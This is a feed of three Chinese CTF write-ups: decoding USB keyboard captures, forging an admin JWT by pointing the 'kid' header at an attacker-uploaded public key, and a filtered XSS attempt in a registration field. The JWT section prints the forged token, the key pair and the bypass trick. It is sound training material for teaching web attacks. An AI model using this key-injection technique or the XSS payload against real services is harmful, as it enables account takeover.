<p>对于keyborad的数据传输，在数据包的<code>Leftover Capture Data</code>中，根据这篇文章：<a href="http://blog.csdn.net/luohsh1/article/details/8645471" target="_blank" rel="external"> USB鼠标、键盘数据格式 </a> 和 <a href="http://www.microchip.com/forums/m438695.aspx" target="_blank" rel="external">HID Keyboard report descriptor</a>。键盘发送给PC的数据每次8个字节，假设收到的数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">02:00:04:00:00:00:00:00</div></pre></td></tr></table></figure></p>
<p>第一个字节是modifier keys，对应的规则如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">|--bit0:   Left Control是否按下，按下为1  </div><div class="line">|--bit1:   Left Shift  是否按下，按下为1  </div><div class="line">|--bit2:   Left Alt    是否按下，按下为1  </div><div class="line">|--bit3:   Left GUI    是否按下，按下为1  </div><div class="line">|--bit4:   Right Control是否按下，按下为1  </div><div class="line">|--bit5:   Right Shift 是否按下，按下为1  </div><div class="line">|--bit6:   Right Alt   是否按下，按下为1  </div><div class="line">|--bit7:   Right GUI   是否按下，按下为1</div></pre></td></tr></table></figure></p>
<p>一个字节是8位，这里是<code>02</code>，即对应着<code>0000 0010</code>，即可解码为<code>Left Shift</code>，也就是说按下了键盘左边的Shift键。假若数据为<code>00</code>，则表示啥都不做。</p>
<p>第二个字节是padding，默认为<code>00</code>。可略过不提。</p>
<p>第三个字节起到第八个字节为普通按键，解码规则可以根据 <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="external">Universal Serial Bus (USB)</a>中第53页的规则来解码。</p>
<p>比如说我们收到了数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">04:00:00:00:00:00</div></pre></td></tr></table></figure></p>
<p>根据解码规则，以及第一字节shift被按下，可知为大写字母<code>A</code>。</p>
<p>接下去开始针对题目提供的数据包进行分析。<br>根据 <a href="https://www.wireshark.org/docs/dfref/u/usb.html" target="_blank" rel="external">https://www.wireshark.org/docs/dfref/u/usb.html</a> 可以知道 <code>Leftover Capture Data</code> 所对应的Field name为 <code>usb.capdata</code>，我们可以把值为<code>00:00:00:00:00:00:00:00</code>的数据过滤掉，因为它表示啥都不输入。</p>
<p>而我们的目标是keyboard的数据，从pcap包中看它对应的设备Device address为3，所对应的Field name为<code>usb.device_address</code>。</p>
<p>我们可以使用tshark命令提取对应的数据，并将其保存到usbdata.txt中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r task.pcap -Y &quot;usb.capdata != 0 and usb.device_address==3&quot; -T fields -e usb.capdata &gt; usbdata.txt</div></pre></td></tr></table></figure></p>
<p>提取出来的数据差不多这样：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170830/3.png?raw=true" alt=""><br>(好吧，至于为什么还有00:00:00:00:00:00:00:00，哪位解释下)</p>
<p>由于还有一些零行，可以用下面命令再过滤一遍：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat usbdata.txt | grep -v &quot;00:00:00:00:00:00:00:00&quot; &gt; usbdata_filter.txt</div></pre></td></tr></table></figure></p>
<p>然后根据解码规则进行解码。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">KEYCODE = &#123;</div><div class="line">    <span class="number">0x04</span>:[<span class="string">'a'</span>, <span class="string">'A'</span>],</div><div class="line">    <span class="number">0x05</span>:[<span class="string">'b'</span>, <span class="string">'B'</span>],</div><div class="line">    <span class="number">0x06</span>:[<span class="string">'c'</span>, <span class="string">'C'</span>],</div><div class="line">    <span class="number">0x07</span>:[<span class="string">'d'</span>, <span class="string">'D'</span>],</div><div class="line">    <span class="number">0x08</span>:[<span class="string">'e'</span>, <span class="string">'E'</span>],</div><div class="line">    <span class="number">0x09</span>:[<span class="string">'f'</span>, <span class="string">'F'</span>],</div><div class="line">    <span class="number">0x0A</span>:[<span class="string">'g'</span>, <span class="string">'G'</span>],</div><div class="line">    <span class="number">0x0B</span>:[<span class="string">'h'</span>, <span class="string">'H'</span>],</div><div class="line">    <span class="number">0x0C</span>:[<span class="string">'i'</span>, <span class="string">'I'</span>],</div><div class="line">    <span class="number">0x0D</span>:[<span class="string">'j'</span>, <span class="string">'J'</span>],</div><div class="line">    <span class="number">0x0E</span>:[<span class="string">'k'</span>, <span class="string">'K'</span>],</div><div class="line">    <span class="number">0x0F</span>:[<span class="string">'l'</span>, <span class="string">'L'</span>],</div><div class="line">    <span class="number">0x10</span>:[<span class="string">'m'</span>, <span class="string">'M'</span>],</div><div class="line">    <span class="number">0x11</span>:[<span class="string">'n'</span>, <span class="string">'N'</span>],</div><div class="line">    <span class="number">0x12</span>:[<span class="string">'o'</span>, <span class="string">'O'</span>],</div><div class="line">    <span class="number">0x13</span>:[<span class="string">'p'</span>, <span class="string">'P'</span>],</div><div class="line">    <span class="number">0x14</span>:[<span class="string">'q'</span>, <span class="string">'Q'</span>],</div><div class="line">    <span class="number">0x15</span>:[<span class="string">'r'</span>, <span class="string">'R'</span>],</div><div class="line">    <span class="number">0x16</span>:[<span class="string">'s'</span>, <span class="string">'S'</span>],</div><div class="line">    <span class="number">0x17</span>:[<span class="string">'t'</span>, <span class="string">'T'</span>],</div><div class="line">    <span class="number">0x18</span>:[<span class="string">'u'</span>, <span class="string">'U'</span>],</div><div class="line">    <span class="number">0x19</span>:[<span class="string">'v'</span>, <span class="string">'V'</span>],</div><div class="line">    <span class="number">0x1A</span>:[<span class="string">'w'</span>, <span class="string">'W'</span>],</div><div class="line">    <span class="number">0x1B</span>:[<span class="string">'x'</span>, <span class="string">'X'</span>],</div><div class="line">    <span class="number">0x1C</span>:[<span class="string">'y'</span>, <span class="string">'Y'</span>],</div><div class="line">    <span class="number">0x1D</span>:[<span class="string">'z'</span>, <span class="string">'Z'</span>],</div><div class="line">    <span class="number">0x1E</span>:[<span class="string">'1'</span>, <span class="string">'!'</span>],</div><div class="line">    <span class="number">0x1F</span>:[<span class="string">'2'</span>, <span class="string">'@'</span>],</div><div class="line">    <span class="number">0x20</span>:[<span class="string">'3'</span>, <span class="string">'#'</span>],</div><div class="line">    <span class="number">0x21</span>:[<span class="string">'4'</span>, <span class="string">'$'</span>],</div><div class="line">    <span class="number">0x22</span>:[<span class="string">'5'</span>, <span class="string">'%'</span>],</div><div class="line">    <span class="number">0x23</span>:[<span class="string">'6'</span>, <span class="string">'^'</span>],</div><div class="line">    <span class="number">0x24</span>:[<span class="string">'7'</span>, <span class="string">'&amp;'</span>],</div><div class="line">    <span class="number">0x25</span>:[<span class="string">'8'</span>, <span class="string">'*'</span>],</div><div class="line">    <span class="number">0x26</span>:[<span class="string">'9'</span>, <span class="string">'('</span>],</div><div class="line">    <span class="number">0x27</span>:[<span class="string">'0'</span>, <span class="string">')'</span>],</div><div class="line">    <span class="number">0x28</span>:[<span class="string">'\n'</span>,<span class="string">'\n'</span>],</div><div class="line">    <span class="number">0x2C</span>:[<span class="string">' '</span>, <span class="string">' '</span>],</div><div class="line">    <span class="number">0x2D</span>:[<span class="string">'-'</span>, <span class="string">'_'</span>],</div><div class="line">    <span class="number">0x2E</span>:[<span class="string">'='</span>, <span class="string">'+'</span>],</div><div class="line">    <span class="number">0x2F</span>:[<span class="string">'['</span>, <span class="string">'&#123;'</span>],</div><div class="line">    <span class="number">0x30</span>:[<span class="string">']'</span>, <span class="string">'&#125;'</span>],</div><div class="line">    <span class="number">0x32</span>:[<span class="string">'#'</span>,<span class="string">'~'</span>],</div><div class="line">    <span class="number">0x33</span>:[<span class="string">';'</span>, <span class="string">':'</span>],</div><div class="line">    <span class="number">0x34</span>:[<span class="string">'\''</span>, <span class="string">'"'</span>],</div><div class="line">    <span class="number">0x36</span>:[<span class="string">','</span>, <span class="string">'&lt;'</span>],</div><div class="line">    <span class="number">0x37</span>:[<span class="string">'.'</span>, <span class="string">'&gt;'</span>],</div><div class="line">    <span class="number">0x38</span>:[<span class="string">'/'</span>, <span class="string">'?'</span>],</div><div class="line">    <span class="number">0x2b</span>:[<span class="string">'\t'</span>,<span class="string">'\t'</span>],</div><div class="line">    <span class="number">0x4f</span>:[<span class="string">u'→'</span>,<span class="string">u'→'</span>],</div><div class="line">    <span class="number">0x50</span>:[<span class="string">u'←'</span>,<span class="string">u'←'</span>],</div><div class="line">    <span class="number">0x51</span>:[<span class="string">u'↓'</span>,<span class="string">u'↓'</span>],</div><div class="line">    <span class="number">0x52</span>:[<span class="string">u'↑'</span>,<span class="string">u'↑'</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line">NA_KEYCODE = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</div><div class="line">file = open(<span class="string">"usbdata_filter.txt"</span>,<span class="string">"rb"</span>)</div><div class="line">result = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    data = file.readline()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    data = data[:<span class="number">-1</span>].split(<span class="string">":"</span>)</div><div class="line">    normalcode = int(data[<span class="number">2</span>],<span class="number">16</span>)</div><div class="line">    <span class="keyword">if</span> normalcode  <span class="keyword">in</span> NA_KEYCODE:</div><div class="line">        <span class="keyword">continue</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">'02'</span>:</div><div class="line">        shiftcode = <span class="number">1</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        shiftcode = <span class="number">0</span></div><div class="line">    <span class="comment"># print(normalcode, shiftcode)</span></div><div class="line">    result += KEYCODE[normalcode][shiftcode]</div><div class="line">file.close()</div><div class="line">print(result)</div></pre></td></tr></table></figure></p>
<p>解出来为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">w</div><div class="line">k</div><div class="line">f</div><div class="line">b</div><div class="line">3&apos;↑[↑l↑#↑&#123;w$↓&gt;b↓ag↓[e↓ci.[↑[f↑&#123;k↑n$↑ju&#125;↓:↓3↓u↓%=↑~↑y↑6↑,&apos;↓p↓b↓7↓%&amp;↑d↑0↑j↑pt↓i↓a↓[↓k(↑=↑r↑m↑]=↓0↓d↓&gt;↓lc↑*↑_↑&#123;↑j%↓u↓s↓(↓*2↑0↑n↑&apos;↑;9↓h↓4↓]↓y4↑&apos;↑k↑;↑+p↓f↓e↓$↓!&#125;↑1↑_↑k↑s&amp;↓s↓2↓c↓%q↑$↑.↑!↑#,↓s↓0↓c↓z3↑e↑&#125;↑-↑i</div></pre></td></tr></table></figure></p>
<p>打出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">w&#123;w$ju&#125;,&apos;pt]=j%;9+ps&amp;#,</div><div class="line">k#&gt;bn$:6pjim0&#123;u&apos;h;fks!s-</div><div class="line">flag&#123;k3yb0ard_sn4ke_2.0&#125;</div><div class="line">b[[e[fu~7d[=&gt;*(0]&apos;$1c$ce</div><div class="line">3&apos;ci.[%=%&amp;k(lc*2y4!&#125;%qz3</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Hackit2017-USB ducker-writeup&lt;br&gt;usb keyboard pcap&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="Forensic" scheme="http://chybeta.github.io/tags/Forensic/"/>
    
  </entry>
  
  <entry>
    <title>HITB CTF 2017-Pasty-writeup</title>
    <link href="http://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/"/>
    <id>http://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</id>
    <published>2017-08-28T23:44:02.000Z</published>
    <updated>2017-08-29T01:23:04.302Z</updated>
    
    <content type="html"><![CDATA[<p>HITB CTF 2017-Pasty-writeup</p>
<p>JWT安全性问题<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Can you find the administrator&apos;s secret message?</div><div class="line">http://47.74.147.52:20012</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看基本功能。<br>注册：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/2.png?raw=true" alt=""></p>
<p>登陆：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/3.png?raw=true" alt=""></p>
<p>写paste，保存:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/4.png?raw=true" alt=""></p>
<p>可以对保存的paste进行下载:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/7.png?raw=true" alt=""></p>
<p>可以看到注册后返回了一大串的字符串，之后写paste保存时即以这个字符串作为身份认证。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJjaHliZXRhIn0.nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A</div></pre></td></tr></table></figure></p>
<p>刚接触时不知道是啥，就拿去用base64解了一下，虽然解出来后后面出现了一大堆的乱码，不过前面解出来入下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;,&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;</div></pre></td></tr></table></figure></p>
<p>然后就开始查找关于JWT的资料了。在 <a href="https://jwt.io/" target="_blank" rel="external">https://jwt.io/</a> 上可以对字符串进行debugger。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/5.png?raw=true" alt=""></p>
<p>JWT由三部分组成。第一部分是头部，原始信息是json格式，包含使用的算法(alg)，类型(typ)，可选的kids字段，将头部原始信息进行base64编码后得到了第一部分字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ</div></pre></td></tr></table></figure></p>
<p>第二部分是payload，原始信息是json格式，包含一些重要信息，比如本题中是<code>&quot;sub&quot;: &quot;chybeta&quot;</code>，这对应着账号的用户，将这部分原始信息进行base64编码后得到第二部分字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJzdWIiOiJjaHliZXRhIn0</div></pre></td></tr></table></figure></p>
<p>第三部分，将第一部分和第二部分字段用点号<code>.</code>连接后根据第一部分里的alg算法进行签名。在本题中采用的是RS256算法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nlSBeeMh5XvdSjs0j_Rs71n0EGBYfrzKfkDq2vnR4jrgYiHCzlZ4R2uwsn0mf3Cpqis6bSAxqB-FR1Af5KYFZe6X_gWf57du4JmPfueHumijptaEJ6Ym23AcIS0HoFSV45PoTv6McEf6vvd0SG7SdECoFv97MCl3mMraedyTCy5p1WJ0ssnOs886Noyn5ak01Eeoi3WA3lVMGflIAft_uIx0pRlUZrkB3WWNYMsecWS9ih1fpMvb-cUYP5s6T_QjW68mQ40QArKa7iRDm3IhNipRa_RmziwPdo1Nh2l0kGGALpBhd1kqh8KdEbp2Kz_sPza6O-iJBX88ImeMEgXI5A</div></pre></td></tr></table></figure></p>
<p>在服务器返回给我们的头部信息中，有一个是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;</div></pre></td></tr></table></figure></p>
<p>关于kid字段(key ID)，它指定了用哪一个key来加密。可以看看这里：<a href="https://stackoverflow.com/questions/43867440/whats-the-meaning-of-the-kid-claim-in-a-jwt-token" target="_blank" rel="external">What’s the meaning of the “kid” claim in a JWT token?</a></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.74.147.52:20012/keys/</div></pre></td></tr></table></figure></p>
<p>可以发现里面有许多pem公钥，我们字段相符合即为3c3c2ea1c3f113f649dc9389dd71b851.pem。</p>
<p>结合头部的alg信息，我们知道它采用的是SH256即sha256签名，这种方式下，发送方（即我们）要用私钥对签名进行加密，接收方（即服务器端）用公钥进行解密，而从头部kid字段知道，公钥的地址实际上是我们可以指定的。所以攻击流程如下:</p>
<ol>
<li>我们先生成公钥私钥对。</li>
<li>用公钥私钥在 jwt.io 上进行签名伪造jwt，其中kid字段指明我们公钥的地址。</li>
<li>服务器端收到jwt后，用kid字段地址中的公钥进行解密，由于公钥和私钥是我们伪造的，所以解密是能成功的。</li>
<li>拿flag。</li>
</ol>
<p>利用openssl生成公钥私钥对。<br>公钥：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-----BEGIN PUBLIC KEY-----</div><div class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsE</div><div class="line">rbxerAjPzF+vkAhbMEZb0+3LzK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIv</div><div class="line">Co9mGCJ7rFsw9BAOIAGGu3pnwr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpb</div><div class="line">xW+zblOEFj0443zTRwIDAQAB</div><div class="line">-----END PUBLIC KEY-----</div></pre></td></tr></table></figure></p>
<p>私钥:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">-----BEGIN RSA PRIVATE KEY-----</div><div class="line">MIICXAIBAAKBgQCdgyNwNiMLtNqIp9y/Iz5q7jsErbxerAjPzF+vkAhbMEZb0+3L</div><div class="line">zK22kE6ArHBtDeME0gxCM1dBZgXVZ0Mg+yyKnUIvCo9mGCJ7rFsw9BAOIAGGu3pn</div><div class="line">wr5CDt05qTsarlDxZ1BBsSnH51OtYZvyclGSuPpbxW+zblOEFj0443zTRwIDAQAB</div><div class="line">AoGAVfIodCIWHV0hoU929BSXCmHTckoabs4QQNKTo4hEBv3gZlrNdlbIssUrEKsG</div><div class="line">7XqWVRsH9VduVREGPduKlYR4WI8yPrjUygUuH7GyrC2w44VtCZQ+3zLObknC7RuA</div><div class="line">+DBWgpMTBNF2f3Tpsj6kkSZXN97X1jS9azUkK1uxeJcG8YECQQDI6s3CjTPwQlr3</div><div class="line">h9kxEFPZDIbqjJjWjzY9CFP+A1nOOsrOjNSj9Mf+Qv/n6oLglLopzSu2hM7Iozwg</div><div class="line">7EBjWiYrAkEAyLH/ROQNFmgrBC+QV7HUsOdgQDPiCftEADZSm+IMzpItoTMMHhQB</div><div class="line">UVjJl8TLd8qajItN+mOBb6Eoddq7u5X1VQJAevvff1tXk5XKgQJS3EmWSaH1Y9U0</div><div class="line">KQH4vVs/rpj2e9pZEh36e3H2iZkRdDCEdFwVqEjCnTKmMQJaZ/y1XRttiQJBAJca</div><div class="line">pSZ6SXxIW7LgGN5d7tRusGJGbfaz7sP2IoZpUNkq6B4JcCMpTsCvh8C0E7mSmoAc</div><div class="line">1k4iIy8n+G2bjWM0Ca0CQHHZ/PXOoCKCGi8mB98pdB36VjbTX81giIboYJXhbVeu</div><div class="line">vXvP1EUuGsjDfk+bX1oFxgauqOA7i7oY+sN5JNdO5Fk=</div><div class="line">-----END RSA PRIVATE KEY-----</div></pre></td></tr></table></figure></p>
<p>用之前注册的账号写一个paste，内容为公钥<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/9.png?raw=true" alt=""></p>
<p>利用下载功能获取到公钥的保存地址，这里为 /api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/10.png?raw=true" alt=""></p>
<p>我们想要让服务器端用我们的公钥来加密，所以在伪造jwt的头部的kid字段应为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;kid&quot;:&quot;/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&quot;</div></pre></td></tr></table></figure></p>
<p>但是由前面观察keys文件夹知道，服务器端会把传进来的url后面加上<code>.pem</code>。即<code>&quot;kid&quot;:&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;</code>会变成去访问<code>keys/3c3c2ea1c3f113f649dc9389dd71b851.pem</code></p>
<p>可以在<code>?raw</code>后面加上一个<code>&amp;</code>，这样加上去后的<code>.pem</code>不会变成后缀而是被当成一个参数。访问 <a href="http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&amp;.pem" target="_blank" rel="external">http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw&amp;.pem</a> 即访问 <a href="http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw" target="_blank" rel="external">http://47.74.147.52:20012/api/paste/fcb82912-1c84-4ce6-9713-755d5f142066?raw</a> ，即我们paste/公钥的保存地址。</p>
<p>接下来用 <a href="https://jwt.io/" target="_blank" rel="external">https://jwt.io/</a> 来生成伪造的jwt。由于要伪造admin，所以sub字段要修改为admin。在公钥和私钥部分填上我们生成的公钥和私钥，在头部kid字段填上公钥的地址。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/8.png?raw=true" alt=""></p>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eyJraWQiOiJhcGkvcGFzdGUvZmNiODI5MTItMWM4NC00Y2U2LTk3MTMtNzU1ZDVmMTQyMDY2P3JhdyYiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.IW5dnvpZAnsmIb4CrAPdwcTApLMzuB4LaDZxzm6nLwRKp4H6SCZUuPi71daWstfUDEGxMmBucTnHmaBCb4VZfxMrKDx0G27J-yJGW-SpGE9j61Punpv0vTaVw0H5SVkU6IZud_OvVWIe6vf_ffmup0Mou7GpCvOn6fUg6XYk8O0</div></pre></td></tr></table></figure></p>
<p>之后在每次操作中，要记得把Authorization字段替换成对应的伪造jwt。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/11.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170829/12.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HITB&#123;b128a14885c4974c4a7016eb1d79aae6&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HITB CTF 2017-Pasty-writeup&lt;/p&gt;
&lt;p&gt;JWT安全性问题&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hackit2017-H4ck3rM1nd-writeup</title>
    <link href="http://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/"/>
    <id>http://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/</id>
    <published>2017-08-28T11:54:28.000Z</published>
    <updated>2017-08-28T12:40:13.280Z</updated>
    
    <content type="html"><![CDATA[<p>跟着wp做的。<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Description: Even hackers want to share their thoughts :)</div><div class="line">Attachment: (none)</div><div class="line">Webpage: http://tasks.ctf.com.ua:13373</div><div class="line">Hint: (none)</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/18.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看基本功能。</p>
<p>注册，需要填写一个secret：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/19.png?raw=true" alt=""></p>
<p>登陆后：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/20.png?raw=true" alt=""></p>
<p>可以看一个profile:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/21.png?raw=true" alt=""></p>
<p>而edit点进去后可以修改about字段。</p>
<p>查看profile.php源代码，发现有一些提示：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/22.png?raw=true" alt=""></p>
<p>注意上图，我们在注册时填入的secret是放在input标签里的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Secret: &lt;input id=&quot;secret&quot; name=&quot;secret&quot; value=&quot;mygod&quot; type=&quot;text&quot;/&gt;</div></pre></td></tr></table></figure></p>
<p>如果我们在注册时填写secret为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;/&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;&quot;</div></pre></td></tr></table></figure></p>
<p>也许能构造出xss？但很可惜被过滤掉了：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170828/23.png?raw=true" alt=""></p>
